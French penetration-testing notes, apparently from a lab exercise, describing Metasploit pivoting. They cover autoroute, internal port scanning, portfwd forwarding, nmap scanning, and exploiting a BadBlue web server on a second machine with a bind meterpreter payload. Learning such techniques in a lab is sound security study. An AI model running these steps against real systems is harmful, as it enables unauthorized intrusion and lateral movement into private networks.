
Lorsqu'un meterpreter est généré, un `ipconfig` permet de voir le nombre d'interface et les autres IP.  

`run autoroute -s <network>/cidr` permet de créer une route de pivot. Mettre la session en background  
`auxiliary/scanner/portscan/tcp` : puis RHOSTS de la machine n°2. PORTS : 1-100 par exemple.  
On lance et on voit que le port 80 est actif en TCP. Mais on ne peut pas se connecter au site Web. On retourne sur notre session meterpreter.  
`portfwd add -l 1234 -p 80 -r IP_addresse_machine_2` on ouvre un port sur la machine d'attaque ("-l 1234") et on précise le port et l'ip de la cible.  
`portfwd list` doit nous afficher notre port en ecoute.  
Dans l'URL, l'IP 127.0.0.1:1234 devrait nous donner la bannière du site web cible (machine 2).  
On remet la session en background pour aller scanner correctement la cible par notre port d'écoute : `db_nmap -sS -sV -p 1234 localhost`  
On voit qu'il ya la vuln badblue.  
Donc `exploit/windows/http/badblue_passthru`, puis `set payload windows/meterpreter/bind\tcp`, le RHOSTS (machine cible n°2)  




